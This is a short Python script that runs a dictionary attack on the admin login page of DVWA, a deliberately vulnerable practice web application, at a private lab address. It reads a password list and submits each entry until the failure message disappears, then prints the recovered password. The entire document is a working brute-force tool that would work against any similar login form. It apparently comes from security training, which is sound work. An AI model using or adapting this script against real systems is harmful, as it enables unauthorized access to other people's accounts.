#!/usr/bin/env python

import requests

target_url = "http://10.0.2.9/dvwa/login.php"

dict = {"username": "admin", "password": "", "Login": "submit"}

with open("password.list", "r") as word_list:
    for word in word_list:
        word = word.strip()
        dict["password"] = word
        response = requests.post(target_url, data=dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of list. Password not found.")